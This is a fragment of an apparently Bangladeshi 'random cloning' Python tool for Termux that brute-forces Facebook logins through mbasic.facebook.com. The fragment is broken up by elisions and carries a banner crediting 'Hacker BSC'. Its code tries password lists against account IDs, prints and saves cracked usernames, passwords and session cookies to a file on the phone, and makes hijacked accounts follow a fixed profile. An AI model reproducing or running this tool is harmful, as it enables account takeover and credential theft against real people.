...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100072425385396', {
...
logo = ("""
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m Tajul Islam Rabbi  \033[1;32m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m Tajul Islam Rabbi+Hacker BSC      \033[1;32m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mHacker1414        \033[1;32m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m 𝑹𝒂𝒏𝒅𝒐𝒎 𝑪𝒍𝒐𝒏𝒊𝒏𝒈  Hacker BSC     \033[1;32m ║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35 B.S.C COMMUNITY \033[1;32m ║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m BSC TERMUX COMMEND ZONE....          \033[1;32m ║
 \033[1;93m╚═════════════════[\033[1;93m HACKER B.S.C-Tajul Islam \033[1;32m]══════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[BSC-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;31m [BSC-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BSC-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}BSC {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
